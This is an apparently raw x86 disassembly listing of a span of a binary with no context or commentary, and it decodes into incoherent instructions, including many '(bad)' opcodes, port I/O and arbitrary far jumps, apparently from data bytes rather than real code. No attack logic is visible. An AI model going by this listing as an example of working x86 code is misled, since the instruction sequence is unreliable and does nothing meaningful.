  410a1d:	mov    cl,0xdf
  410a1f:	mov    bl,0x37
  410a21:	and    al,0x98
  410a23:	xchg   ch,bl
  410a25:	cmp    al,0x5e
  410a27:	xchg   esi,eax
  410a28:	dec    edx
  410a29:	ss mov ebx,0xca95bbf0
  410a2f:	das    
  410a30:	add    al,0x84
  410a32:	pop    es
  410a33:	pop    ds
  410a34:	or     bh,BYTE PTR [esi+0x31ed1828]
  410a3a:	popa   
  410a3b:	jmp    0x410a51
  410a3d:	mov    ds:0x2739a223,al
  410a42:	in     al,0x53
  410a44:	movq   mm1,mm1
  410a47:	mov    BYTE PTR [edi+esi*1+0x5f],al
  410a4b:	adc    DWORD PTR [edx-0x2bc64dd3],0xb4975e45
  410a55:	data16 or ah,0x7a
  410a59:	fisubr DWORD PTR [esi+0x631248ee]
  410a5f:	jp     0x410ac4
  410a61:	imul   eax,ebp,0xffffffec
  410a64:	out    0xd7,eax
  410a66:	or     eax,0xd91ea0a6
  410a6b:	jge    0x410ac4
  410a6d:	and    edi,DWORD PTR [eax+0x5878e0fa]
  410a73:	in     eax,dx
  410a74:	jge    0x410a12
  410a76:	js     0x410a89
  410a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a79:	cdq    
  410a7a:	pop    edi
  410a7b:	sbb    eax,0x3f92d44a
  410a80:	mov    edx,0x647b3ff3
  410a85:	test   BYTE PTR [edx+0x4],0xe0
  410a89:	repz daa 
  410a8b:	ja     0x410ae5
  410a8d:	ficomp WORD PTR [edi+0x4a3f219b]
  410a93:	dec    eax
  410a94:	push   edx
  410a95:	test   al,0x6b
  410a97:	fucomp st(2)
  410a99:	or     esp,0x96c30b0
  410a9f:	xchg   ebp,eax
  410aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aa1:	jno    0x410b02
  410aa3:	scas   al,BYTE PTR es:[edi]
  410aa4:	mov    edx,DWORD PTR [ebx+0x47]
  410aa7:	dec    DWORD PTR [esi+0x63cbcff5]
  410aad:	sub    dl,bh
  410aaf:	push   esi
  410ab0:	repnz lods al,BYTE PTR ds:[esi]
  410ab2:	mov    cl,0x1a
  410ab4:	cmp    al,BYTE PTR [esi]
  410ab6:	add    BYTE PTR [esi-0x43],dl
  410ab9:	mov    al,0x44
  410abb:	adc    al,0x9
  410abd:	out    0xce,eax
  410abf:	pop    edi
  410ac0:	mov    ecx,0x22f09ffa
  410ac5:	push   esp
  410ac6:	jns    0x410abb
  410ac8:	jle    0x410a54
  410aca:	pusha  
  410acb:	adc    eax,0x5a5e6188
  410ad0:	gs clc 
  410ad2:	jae    0x410a72
  410ad4:	enter  0xe160,0x4e
  410ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad9:	inc    ebp
  410ada:	out    dx,eax
  410adb:	mov    cl,BYTE PTR [ebx-0x35]
  410ade:	or     edx,DWORD PTR [edx+eiz*2]
  410ae1:	(bad)  
  410ae3:	adc    BYTE PTR [eax],0xab
  410ae6:	jge    0x410a7e
  410ae8:	mov    WORD PTR [esi+0x67],cs
  410aeb:	(bad)
  410aef:	es push edx
  410af1:	mov    DWORD PTR [ebx-0x25],ecx
  410af4:	out    0x8c,eax
  410af6:	scas   eax,DWORD PTR es:[edi]
  410af7:	ja     0x410b34
  410af9:	pop    ecx
  410afa:	out    0xb7,al
  410afc:	lock xlat BYTE PTR ds:[ebx]
  410afe:	pop    esp
  410aff:	loopne 0x410b07
  410b01:	(bad)  
  410b03:	je     0x410ae0
  410b05:	mov    ss,ebx
  410b07:	mov    cl,0x9e
  410b09:	popf   
  410b0a:	xchg   edx,eax
  410b0b:	sbb    eax,0xb461758f
  410b10:	fwait
  410b11:	pop    es
  410b12:	(bad)  
  410b13:	sti    
  410b14:	or     al,0x8
  410b16:	scas   eax,DWORD PTR es:[edi]
  410b17:	fs jl  0x410b61
  410b1a:	mov    DWORD PTR [eax],esp
  410b1c:	shl    edx,0x35
  410b1f:	adc    BYTE PTR [ecx],bl
  410b21:	xchg   edi,eax
  410b22:	sbb    BYTE PTR ds:0x3f132f79,bh
  410b28:	ds jo  0x410b00
  410b2b:	fsubrp st(2),st
  410b2d:	or     al,BYTE PTR [edi-0x7f]
  410b30:	cwde   
  410b31:	lds    edi,FWORD PTR [edx-0x5d]
  410b34:	popa   
  410b35:	test   al,0xca
  410b37:	pop    ecx
  410b38:	sbb    DWORD PTR [edx],esi
  410b3a:	adc    eax,0x178d5ce
  410b3f:	xlat   BYTE PTR ds:[ebx]
  410b40:	sub    esp,DWORD PTR [ebp+0x3b]
  410b43:	or     BYTE PTR [esi-0x3e],al
  410b46:	pop    edi
  410b47:	push   0x2
  410b49:	mov    dh,0xb7
  410b4b:	(bad)  
  410b4d:	fidivr WORD PTR [ecx]
  410b4f:	(bad)  [eax-0x42a17939]
  410b55:	out    dx,al
  410b56:	sti    
  410b57:	dec    eax
  410b58:	sbb    dl,BYTE PTR [eax+0x11]
  410b5b:	(bad)  
  410b5c:	leave  
  410b5d:	xchg   BYTE PTR [ecx+0x39],cl
  410b60:	push   0x2d
  410b62:	push   ss
  410b63:	daa    
  410b64:	inc    eax
  410b65:	fnstsw WORD PTR [ebx+0x74bb14b7]
  410b6b:	push   es
  410b6c:	cmp    ebp,DWORD PTR [esi]
  410b6e:	pop    esp
  410b6f:	sti    
  410b70:	or     al,0x57
  410b72:	outs   dx,DWORD PTR ds:[esi]
  410b73:	jne    0x410b2b
  410b75:	xchg   ebx,eax
  410b76:	add    esi,DWORD PTR [ecx]
  410b78:	jne    0x410b7b
  410b7a:	(bad)  
  410b7b:	rol    BYTE PTR [ebx],1
  410b7d:	and    edi,DWORD PTR [edi]
  410b7f:	repz out dx,eax
  410b81:	ret    
  410b82:	jo     0x410b41
  410b84:	dec    edx
  410b85:	loop   0x410b1c
  410b87:	and    BYTE PTR [eax+0x133856a6],bl
  410b8d:	scas   eax,DWORD PTR es:[edi]
  410b8e:	leave  
  410b8f:	add    eax,0xb066fe2b
  410b94:	std    
  410b95:	jnp    0x410b2d
  410b97:	sbb    BYTE PTR [edx+0x16],al
  410b9a:	js     0x410c0f
  410b9c:	xor    al,0x3f
  410b9e:	push   0xfffffff5
  410ba0:	ins    DWORD PTR es:[edi],dx
  410ba1:	adc    BYTE PTR [eax-0x19d3470f],dl
  410ba7:	icebp  
  410ba8:	nop
  410ba9:	cli    
  410baa:	imul   DWORD PTR [ebp+0x32]
  410bad:	mov    ?,ebx
  410baf:	pop    ebp
  410bb0:	imul   ebp,DWORD PTR [edx+0x7f673713],0xffffff83
  410bb7:	mov    edi,0x6de1979b
  410bbc:	dec    esi
  410bbd:	dec    esp
  410bbe:	arpl   WORD PTR [ecx-0x73],sp
  410bc1:	adc    eax,DWORD PTR [esi-0x52]
  410bc4:	cmp    eax,esp
  410bc6:	push   ds
  410bc7:	xchg   ebp,eax
  410bc8:	test   eax,0xc47371d7
  410bcd:	lods   eax,DWORD PTR ds:[esi]
  410bce:	fstp   TBYTE PTR [esi]
  410bd0:	loopne 0x410bcf
  410bd2:	cld    
  410bd3:	rol    DWORD PTR [edi+0x70],cl
  410bd6:	cwd    
  410bd8:	stos   DWORD PTR es:[edi],eax
  410bd9:	nop
  410bda:	cmp    al,BYTE PTR ds:0x2096ae58
  410be0:	jge    0x410bf5
  410be2:	add    dh,BYTE PTR [esi-0x1e]
  410be5:	pop    ecx
  410be6:	in     al,dx
  410be7:	push   ss
  410be8:	sbb    DWORD PTR [ebp+ebp*8+0x1c],ecx
  410bec:	es scas eax,DWORD PTR es:[edi]
  410bee:	add    al,0x9b
  410bf0:	jne    0x410bb3
  410bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf3:	aaa    
  410bf4:	jle    0x410c10
  410bf6:	jno    0x410c3a
  410bf8:	jle    0x410c51
  410bfa:	jl     0xbb56d411
  410c00:	jmp    DWORD PTR [ebp+0x2eb36802]
  410c06:	pop    ebp
  410c07:	sbb    al,0x63
  410c09:	cmp    BYTE PTR [edx+0x55d92c13],dh
  410c0f:	loope  0x410c05
  410c11:	jecxz  0x410bf6
  410c13:	ins    BYTE PTR es:[edi],dx
  410c14:	xchg   esi,eax
  410c15:	xchg   DWORD PTR [ebp+eiz*4-0x19],ecx
  410c19:	js     0x410c02
  410c1b:	in     eax,dx
  410c1c:	jb     0x410ba8
  410c1e:	scas   eax,DWORD PTR es:[edi]
  410c1f:	cmp    dl,bh
  410c21:	mov    gs,WORD PTR [ecx]
  410c23:	popa   
  410c24:	push   0x72
  410c26:	mov    edx,0xfa43102f
  410c2b:	mov    ds:0xc7cc3841,eax
  410c30:	sub    esp,DWORD PTR [eax]
  410c32:	(bad)  
  410c33:	sti    
  410c34:	arpl   WORD PTR [edx],sp
  410c36:	jbe    0x410c1b
  410c38:	mov    cl,0xe3
  410c3a:	push   ss
  410c3b:	xlat   BYTE PTR ds:[ebx]
  410c3c:	xor    BYTE PTR [esi+ebx*8+0x54],ch
  410c40:	jmp    0xb9fb:0xa1a10533
  410c47:	jmp    0x410c1a
  410c49:	iret   
  410c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4b:	cmc    
  410c4c:	xchg   ebx,eax
  410c4d:	sub    ebp,DWORD PTR es:[esi-0x6e]
  410c51:	imul   edi,DWORD PTR [ecx+0x4b212f35],0xdf06ca4c
  410c5b:	int    0xb9
  410c5d:	aaa    
  410c5e:	or     eax,0x7bb9a066
  410c63:	clc    
  410c64:	push   edi
  410c65:	sbb    BYTE PTR [ebp+0x73],bh
  410c68:	pop    ecx
  410c69:	ror    BYTE PTR [edx+0xedc48d3],1
  410c6f:	push   edx
  410c70:	jle    0x410c08
  410c72:	lods   eax,DWORD PTR ds:[esi]
  410c73:	inc    eax
  410c74:	mov    ecx,0x60c4a64a
  410c79:	shl    edx,cl
  410c7b:	adc    BYTE PTR [edx],cl
  410c7d:	jno    0x410c72
  410c7f:	aam    0x1e
  410c81:	jb     0x410c5b
  410c83:	add    al,0x9
  410c85:	mov    ah,0x85
  410c87:	mov    bl,BYTE PTR [edi+0x15c9558b]
  410c8d:	sbb    al,0x63
  410c8f:	cmovnp esp,DWORD PTR [edx+ebx*2-0x80]
  410c94:	repz and cl,bh
  410c97:	jb     0x410c2c
  410c99:	push   edi
  410c9a:	sub    al,0xc4
  410c9c:	inc    ebx
  410c9d:	cli    
  410c9e:	jbe    0x410c30
  410ca0:	mov    al,ds:0x6fd26a7b
  410ca5:	aas    
  410ca6:	or     esp,DWORD PTR [edi+0x150bb4bf]
  410cac:	sbb    BYTE PTR [eax+0xc1e98c1],ch
  410cb2:	addr16 push ss
  410cb4:	sbb    ch,al
  410cb6:	hlt    
  410cb7:	(bad)  
  410cb9:	push   cs
  410cba:	xor    eax,0x7ee4c45d
  410cbf:	jnp    0x410cac
  410cc1:	xchg   BYTE PTR [ebp+0x67],ch
  410cc4:	rol    DWORD PTR [ebp-0x41],1
  410cc7:	aaa    
  410cc8:	sbb    DWORD PTR [ebx+0x1cef6390],eax
  410cce:	or     al,0x48
  410cd0:	mov    cl,0xa1
  410cd2:	ins    DWORD PTR es:[edi],dx
  410cd3:	xchg   dl,ch
  410cd5:	das    
  410cd6:	push   edi
  410cd7:	test   al,0x61
  410cd9:	jp     0x410c82
  410cdb:	enter  0x3dc1,0x28
  410cdf:	popf   
  410ce0:	(bad)  
  410ce1:	outs   dx,BYTE PTR ds:[esi]
  410ce2:	int3   
  410ce3:	test   DWORD PTR [esi-0x30b54714],eax
  410ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cea:	mov    al,BYTE PTR [ebx-0x55949361]
  410cf0:	es jmp 0xea3af70c
  410cf6:	lea    edx,[esi]
  410cf8:	popf   
  410cf9:	or     BYTE PTR [ebx-0x5c],dl
  410cfc:	out    dx,eax
  410cfd:	inc    ebp
  410cfe:	mov    ds:0x43280887,al
  410d03:	sbb    eax,0xc60284ae
  410d08:	iret   
  410d09:	jl     0x410d0f
  410d0b:	mov    esi,0xa21cfd85
  410d10:	or     DWORD PTR [ecx],0x37
  410d13:	ret    0x990c
  410d16:	or     bh,cl
  410d18:	pop    es
  410d19:	cmpps  xmm0,XMMWORD PTR [esi-0xf6d7879],0x8
  410d21:	add    ebx,DWORD PTR [esi+0x5b]
  410d24:	add    DWORD PTR [ebp+eiz*4+0x1c],ecx
  410d28:	ins    BYTE PTR es:[edi],dx
  410d29:	stc    
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	xor    BYTE PTR [ecx],0xf7
  410d2e:	shl    bl,0xfa
  410d31:	pop    ebp
  410d32:	cmp    BYTE PTR [eax],bl
  410d34:	mov    edx,0xd94c3dd5
  410d39:	mov    edx,0x164a40be
  410d3e:	xor    eax,0x86dffed
  410d43:	popa   
  410d44:	mov    ch,0x40
  410d46:	iret   
  410d47:	add    ah,al
  410d49:	(bad)  
  410d4a:	stc    
  410d4b:	clc    
  410d4c:	cli    
  410d4d:	std    
  410d4e:	nop
  410d4f:	add    DWORD PTR es:[eax+0x5d],0xd9496347
  410d57:	inc    esp
  410d58:	xor    DWORD PTR [ebp-0x2d],0x66
  410d5c:	leave  
  410d5d:	dec    edi
  410d5e:	pop    ds
  410d5f:	imul   ebp,edx,0x1c67f44
  410d65:	ja     0x410d28
  410d67:	push   0xf5fb798e
  410d6c:	xchg   BYTE PTR [ebx+0x3e77d14a],cl
  410d72:	mov    WORD PTR [edi+0x13],gs
  410d75:	jne    0x410dd2
  410d77:	inc    edi
  410d78:	lods   eax,DWORD PTR ds:[esi]
  410d79:	mov    DWORD PTR [ecx-0x1e],ecx
  410d7c:	push   ds
  410d7d:	push   esp
  410d7e:	sbb    eax,0xfa70cadd
  410d83:	in     al,0xa9
  410d85:	ss inc edx
  410d87:	dec    ebp
  410d88:	xor    eax,0x992ba9b8
  410d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d8e:	lahf   
  410d8f:	mov    ch,0x17
  410d91:	push   es
  410d92:	pop    esi
  410d93:	in     eax,0x12
  410d95:	mov    ebp,0xf38c1e52
  410d9a:	sbb    al,0x3b
  410d9c:	out    0x5,eax
  410d9e:	mov    bh,0xa4
  410da0:	add    BYTE PTR [ebp-0x1998acb0],bl
  410da6:	jecxz  0x410d98
  410da8:	test   eax,0xaf52c6a7
  410dad:	sub    DWORD PTR [eax],esi
  410daf:	out    0x5f,eax
  410db1:	es mov edx,0x6d172a00
  410db7:	loopne 0x410e0a
  410db9:	push   eax
  410dba:	sbb    eax,0xd6587069
  410dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dc0:	sbb    al,0x70
  410dc2:	fist   DWORD PTR [ebx+ecx*1+0x2d0a536]
  410dc9:	mov    DWORD PTR [eax],ecx
  410dcb:	ficom  DWORD PTR [eax]
  410dcd:	add    eax,0xcd996c12
  410dd2:	ins    BYTE PTR es:[edi],dx
  410dd3:	sbb    al,BYTE PTR [eax+ecx*4-0x5972026e]
  410dda:	daa    
  410ddb:	(bad)  [edi]
  410ddd:	mov    dh,BYTE PTR [edi]
  410ddf:	push   ss
  410de0:	fcom   DWORD PTR [esi+0x6f]
  410de3:	inc    ecx
  410de4:	push   ebp
  410de5:	xor    al,0xc1
  410de7:	fst    DWORD PTR [edx]
  410de9:	cwde   
  410dea:	jle    0x410dd2
  410dec:	aad    0x1d
  410dee:	sub    eax,0x23dfee39
  410df3:	mov    ebp,edi
  410df5:	inc    ebx
  410df6:	imul   esi,esi,0x42
  410df9:	push   es
  410dfa:	mov    eax,0xc285330
  410dff:	sub    bl,BYTE PTR [esi+0x2f]
  410e02:	test   eax,0x764234e2
  410e07:	into   
  410e08:	lds    ebx,FWORD PTR [ebp+0x74a0612c]
  410e0e:	sub    al,0x94
  410e10:	add    ebx,DWORD PTR [ebx+eiz*1-0x6]
  410e14:	pop    DWORD PTR [eax+0x608dc495]
  410e1a:	sub    ah,BYTE PTR [esi]
  410e1c:	pop    es
  410e1d:	jmp    0x410dd3
  410e1f:	loope  0x410e90
  410e21:	mov    cl,0x84
  410e23:	in     eax,dx
  410e24:	xchg   edi,eax
  410e25:	jecxz  0x410dae
  410e27:	adc    eax,0x22e10ac5
  410e2c:	lock shl BYTE PTR [edi+0x5e],cl
  410e30:	inc    edi
  410e31:	mov    ebp,0x8f512e94
  410e36:	xchg   bl,cl
  410e38:	sub    dl,BYTE PTR [edi]
  410e3a:	inc    eax
  410e3b:	jl     0x410e36
  410e3d:	cld    
  410e3e:	sti    
  410e3f:	int3   
  410e40:	add    BYTE PTR fs:[ecx],ah
  410e43:	xor    bh,bl
  410e45:	mov    cl,0x2b
  410e47:	shl    BYTE PTR [edx+0x67],1
  410e4a:	call   0x8310:0x51410983
  410e51:	add    al,0x22
  410e53:	je     0x410e9a
  410e55:	loope  0x410e67
  410e57:	jb     0x410e65
  410e59:	and    cl,al
  410e5b:	(bad)  
  410e5c:	loope  0x410df9
  410e5e:	inc    esi
  410e5f:	and    edi,esp
  410e61:	dec    eax
  410e62:	retf   
  410e63:	out    0x51,al
  410e65:	stos   BYTE PTR es:[edi],al
  410e66:	ins    DWORD PTR es:[edi],dx
  410e67:	repz retf 
  410e69:	ins    BYTE PTR es:[edi],dx
  410e6a:	das    
  410e6b:	fnstcw WORD PTR [edi-0x1c]
  410e6e:	xor    al,0x5f
  410e70:	test   eax,0xfb3589d9
  410e75:	xchg   esi,eax
  410e76:	mov    ch,0x80
  410e79:	pop    esi
  410e7a:	jmp    0x3eb6:0x93f352af
  410e81:	ret    
  410e82:	(bad)  
  410e83:	jle    0x410ed7
  410e85:	cmp    ecx,esi
  410e87:	jae    0x410e40
  410e89:	sbb    dh,BYTE PTR [ecx-0x22831dea]
  410e8f:	add    ah,BYTE PTR ds:0x25de948b
  410e95:	pusha  
  410e96:	pop    ecx
  410e97:	jnp    0x410e24
  410e99:	inc    ebp
  410e9a:	mov    ah,0x3b
  410e9c:	xor    esp,ebp
  410e9e:	outs   dx,BYTE PTR ds:[esi]
  410e9f:	inc    BYTE PTR [ebx+0x47]
  410ea2:	shr    bl,0xb0
  410ea5:	and    DWORD PTR [ecx+0x31],0xd00feef1
  410eac:	dec    ecx
  410ead:	enter  0xf53a,0x86
  410eb1:	xchg   esi,eax
  410eb2:	(bad)  
  410eb3:	aaa    
  410eb4:	das    
  410eb5:	clc    
  410eb6:	sbb    cl,BYTE PTR [esi-0x48fb9408]
  410ebc:	ret    
  410ebd:	fnclex 
  410ebf:	retf   0x4840
  410ec2:	pop    eax
  410ec3:	bound  eax,QWORD PTR [ebp*1-0x446bc1e9]
  410eca:	cmp    BYTE PTR [ecx-0x69],al
  410ecd:	add    al,0xc5
  410ecf:	call   0xbae6131d
  410ed4:	xor    BYTE PTR [edi+0x10],dl
  410ed7:	adc    DWORD PTR ds:0x5c8200c4,esi
  410edd:	dec    ebp
  410ede:	scas   eax,DWORD PTR es:[edi]
  410edf:	dec    ebx
  410ee0:	sbb    DWORD PTR [edi+0x7562ac2a],esi
  410ee6:	cmp    bl,ah
  410ee8:	ins    DWORD PTR es:[edi],dx
  410ee9:	fistp  DWORD PTR [ebx-0x20e4c942]
  410eef:	dec    ebx
  410ef0:	inc    edi
  410ef1:	inc    ecx
  410ef2:	and    ebp,ebp
  410ef4:	mov    eax,0xfdf05ebc
  410ef9:	push   es
  410efa:	sbb    DWORD PTR [ecx],0x71
  410efd:	mov    al,0x39
  410eff:	cmp    BYTE PTR [ebp-0x78b9ebbf],ch
  410f05:	(bad)  ds:0x99e87550
  410f0b:	mov    bl,0xa0
  410f0d:	popa   
  410f0e:	jo     0x410f72
  410f10:	xor    eax,0x19ac7c37
  410f15:	sbb    eax,DWORD PTR [ecx+eax*2-0x3c951f8f]
  410f1c:	pusha  
  410f1d:	(bad)  [esi-0x73497619]
  410f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f24:	aaa    
  410f25:	test   ebp,esi
  410f27:	std    
  410f28:	loope  0x410ed2
  410f2a:	nop
  410f2b:	push   0x1b40f3e1
  410f30:	and    DWORD PTR [esi-0x40],edi
  410f33:	in     eax,0x55
  410f35:	adc    eax,DWORD PTR [ebp-0x3d02a16]
  410f3b:	(bad)  [eax]
  410f3d:	xchg   ebx,eax
  410f3e:	fs dec esi
  410f40:	outs   dx,BYTE PTR ds:[esi]
  410f41:	push   edi
  410f42:	jecxz  0x410ed0
  410f44:	pusha  
  410f45:	fcomp  DWORD PTR [ecx-0x36]
  410f48:	mov    edi,0x7958bec5
  410f4d:	into   
  410f4e:	fwait
  410f4f:	jg     0x410f45
  410f51:	add    DWORD PTR [esi-0x12f3ee66],ebx
  410f57:	xor    BYTE PTR [edi+0x46],ch
  410f5a:	lods   eax,DWORD PTR ds:[esi]
  410f5b:	mov    ebp,0x8d0efc64
  410f60:	(bad)  
  410f61:	cmc    
  410f62:	push   cs
  410f63:	shl    cl,1
  410f65:	and    ah,al
  410f67:	das    
  410f68:	jle    0x410f0d
  410f6a:	sub    eax,0x9a3e475f
  410f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f70:	ja     0x410fb0
  410f72:	test   al,0x90
  410f74:	lds    ecx,FWORD PTR [esi-0x32e314e9]
  410f7a:	inc    edx
  410f7b:	xchg   edi,eax
  410f7c:	xor    ebx,esp
  410f7e:	jge    0x410f63
  410f80:	fwait
  410f81:	test   BYTE PTR ds:0xb20f7b33,dl
  410f87:	(bad)  
  410f88:	pop    esi
  410f89:	push   ebp
  410f8a:	mov    ds:0x26d98bdf,eax
  410f8f:	pop    esi
  410f90:	inc    ebp
  410f91:	mov    ah,BYTE PTR [ebx-0x67]
  410f94:	cmp    al,BYTE PTR [eax-0x22af546c]
  410f9a:	mov    eax,ds:0x66c0af64
  410f9f:	xor    eax,0x1699891d
  410fa4:	and    edi,DWORD PTR [edx-0x71be0414]
  410faa:	and    DWORD PTR [eiz*1+0x20809c70],ecx
  410fb1:	out    dx,al
  410fb2:	addr16 dec ebp
  410fb4:	rol    edx,0x65
  410fb7:	iret   
  410fb8:	adc    eax,0xc8076805
  410fbd:	mov    al,0xa2
  410fbf:	out    dx,eax
  410fc0:	sub    eax,0x1da54db4
  410fc5:	add    ebx,esi
  410fc7:	sar    esi,0xce
  410fca:	fild   QWORD PTR [esi+0x4df30874]
  410fd0:	dec    edi
  410fd1:	add    BYTE PTR [edx],0x57
  410fd4:	pop    edi
  410fd5:	adc    dh,BYTE PTR [esi-0x44]
  410fd8:	push   0x3a79cd72
  410fdd:	ja     0x411019
  410fdf:	pop    ebp
  410fe0:	retf   0xf499
  410fe3:	das    
  410fe4:	dec    ebp
  410fe5:	cmp    eax,0xdb11c1d0
  410fea:	add    esi,DWORD PTR [edi]
  410fec:	mov    bl,0x65
  410fef:	push   0x7
  410ff1:	cmp    BYTE PTR [ebp-0x5be5481c],al
  410ff7:	cmp    al,0xf4
  410ff9:	mov    al,0x78
  410ffb:	push   0x7881b371
  411000:	test   DWORD PTR ds:0xb053b2ca,edx
  411006:	(bad)  
  411007:	in     eax,dx
  411008:	(bad)  
  411009:	imul   esp,esp,0xf80bad49
  41100f:	je     0x410fbb
  411011:	mov    esi,edi
  411013:	sub    bh,dh
  411015:	aaa    
  411016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411017:	imul   edx,ecx,0x55
  41101a:	or     esi,eax
  41101c:	rcl    dh,1
  41101e:	add    ah,al
  411020:	(bad)  
  411021:	(bad)  [edi+0x19]
  411024:	pandn  mm3,QWORD PTR [edi]
  411027:	jo     0x410fc1
  411029:	jo     0x41109b
  41102b:	mov    al,ds:0xafd1d767
  411030:	lea    esp,ds:0xea8207db
  411036:	mov    DWORD PTR [edx+0x333721b8],ebx
  41103c:	inc    edx
  41103d:	retfw  0x4d9d
  411041:	add    ah,BYTE PTR [edx+eax*4]
  411044:	pop    esp
  411045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411046:	add    ebx,DWORD PTR [ebx+0x36]
  411049:	jnp    0x41107a
  41104b:	xlat   BYTE PTR ds:[ebx]
  41104c:	loope  0x410fd2
  41104e:	into   
  41104f:	rol    DWORD PTR [ebx+0x448b2e46],cl
  411055:	nop
  411056:	xor    al,0x1e
  411058:	rcl    BYTE PTR [edi+edi*8-0x16452a33],cl
  41105f:	cmp    ebx,ecx
  411061:	paddusb mm0,QWORD PTR [edi+0x3189ccc]
  411068:	aam    0x4d
  41106a:	and    al,0x7f
  41106c:	enter  0xfb97,0xab
  411070:	xor    al,0x8f
  411072:	popf   
  411073:	je     0x411003
  411075:	sub    dh,ah
  411077:	js     0x41102f
  411079:	sti    
  41107a:	ret    0xcffe
  41107d:	loope  0x41101a
  41107f:	aas    
  411080:	lds    eax,FWORD PTR [edx]
  411082:	jp     0x4110ee
  411084:	xor    eax,DWORD PTR [eax]
  411086:	xor    eax,0x6387adb4
  41108b:	jmp    0xa654:0x5481be6b
  411092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411093:	enter  0x24e9,0x79
  411097:	es sbb eax,0xb83e3816
  41109d:	mov    dh,0x8e
  41109f:	jno    0x411108
  4110a1:	clc    
  4110a2:	push   es
  4110a3:	scas   eax,DWORD PTR es:[edi]
  4110a4:	test   DWORD PTR [ebp-0x40e17e51],0x64d038b2
  4110ae:	add    esi,esi
  4110b0:	std    
  4110b1:	ror    DWORD PTR [ebp+edx*4-0xd],cl
  4110b5:	fisubr WORD PTR [esp+esi*8-0x43e84b16]
  4110bc:	imul   ecx,esi,0x678160f9
  4110c2:	fs out 0x7d,al
  4110c5:	mov    fs:0x4042a696,eax
  4110cb:	ja     0x4110e0
  4110cd:	jae    0x4110ae
  4110cf:	in     eax,0xc7
  4110d1:	mov    DWORD PTR [ebx+0x4f],ebx
  4110d4:	cmp    eax,esp
  4110d6:	imul   esi,ebp,0x7812c4b4
  4110dc:	adc    eax,0x3337d228
  4110e1:	jns    0x411133
  4110e3:	sbb    bh,bh
  4110e5:	loop   0x4110fa
  4110e7:	pop    ebx
  4110e8:	mov    bh,0xd7
  4110ea:	iret   
  4110eb:	jnp    0x41112f
  4110ed:	in     eax,0x18
  4110ef:	jns    0x41114a
  4110f1:	neg    DWORD PTR [ebx]
  4110f3:	pop    edi
  4110f4:	out    dx,al
  4110f5:	repz or al,0xf5
  4110f8:	inc    esi
  4110f9:	ror    BYTE PTR [ebx+0xc],cl
  4110fc:	into   
  4110fd:	jmp    0x8d993821
  411102:	test   eax,0x51df7192
  411107:	mov    BYTE PTR [ecx*2+0x7c338ebd],ah
  41110e:	cmp    esi,DWORD PTR [ebx-0x405eb899]
  411114:	ss ja  0x411102
  411117:	mov    cl,bh
  411119:	inc    edi
  41111a:	lock xchg esp,eax
  41111c:	mov    ah,0xbc
  41111e:	int    0x64
  411120:	mov    ah,0x36
  411122:	fiadd  WORD PTR [edi]
  411124:	sbb    ah,BYTE PTR [ecx]
  411126:	sbb    DWORD PTR [esi-0x338eed05],ebp
  41112c:	icebp  
  41112d:	mov    cl,0x31
  41112f:	mov    ds:0xf2b660ff,eax
  411134:	inc    ebp
  411135:	addr16 pop ds
  411137:	xor    ch,BYTE PTR [ebp-0x73]
  41113a:	mov    al,0x8b
  41113c:	ins    BYTE PTR es:[edi],dx
  41113d:	or     DWORD PTR [ebx-0x1c],0x39
  411141:	dec    edx
  411142:	(bad)  
  411144:	sbb    DWORD PTR [eax],esi
  411146:	(bad)  
  411147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411148:	fild   DWORD PTR ds:0x94d4c532
  41114e:	sbb    bh,0x7c
  411151:	fsubr  st,st(5)
  411153:	push   es
  411154:	adc    ebp,ecx
  411156:	mov    edx,0x77071cd
  41115b:	or     eax,0x4991f54d
  411160:	lea    edx,[ebp-0x46]
  411163:	cdq    
  411164:	push   ecx
  411165:	mov    DWORD PTR cs:[edi-0x7a87eb27],esp
  41116c:	aam    0xe7
  41116e:	dec    esi
  41116f:	inc    edx
  411170:	iret   
  411171:	cwde   
  411172:	leave  
  411173:	ror    ebx,0x1d
  411176:	adc    bl,bh
  411178:	jp     0x4111d3
  41117a:	cli    
  41117b:	imul   esp,edi,0x7b295a8c
  411181:	imul   esi,DWORD PTR [edi],0x2f6ca42f
  411187:	popf   
  411188:	and    eax,0x27c398a2
  41118d:	mov    edx,0x3449b139
  411192:	pop    edx
  411193:	jbe    0x4111ef
  411195:	ss leave 
  411197:	test   ebx,0x29471975
  41119d:	mov    esi,0xc6e60d8c
  4111a2:	push   0x879c608f
  4111a7:	repnz loope 0x4111d6
  4111aa:	pop    esi
  4111ab:	in     eax,dx
  4111ac:	xor    DWORD PTR [edx],ecx
  4111ae:	fnstsw WORD PTR [edi+0x4e]
  4111b1:	or     BYTE PTR [ecx-0x1ab53feb],ch
  4111b7:	std    
  4111b8:	sar    DWORD PTR [ebx],cl
  4111ba:	adc    bl,BYTE PTR [edi-0x63]
  4111bd:	std    
  4111be:	xor    DWORD PTR [ecx+eiz*2+0x70],ecx
  4111c2:	(bad)  
  4111c3:	sub    eax,0x9772095f
  4111c8:	enter  0xac4a,0xbd
  4111cc:	clc    
  4111cd:	dec    ecx
  4111ce:	push   eax
  4111cf:	push   ecx
  4111d0:	in     al,dx
  4111d1:	imul   bx,WORD PTR gs:[esp+ebx*1+0xddeb942],0xc768
  4111dc:	test   eax,0xa32ca51a
  4111e1:	in     eax,dx
  4111e2:	xchg   esi,eax
  4111e3:	push   edx
  4111e4:	cmp    ax,0x6c47
  4111e8:	dec    esp
  4111e9:	stos   BYTE PTR es:[edi],al
  4111ea:	cdq    
  4111eb:	out    0xc6,eax
  4111ed:	mul    DWORD PTR [edx]
  4111ef:	mov    ?,WORD PTR [esi+esi*4+0x1c]
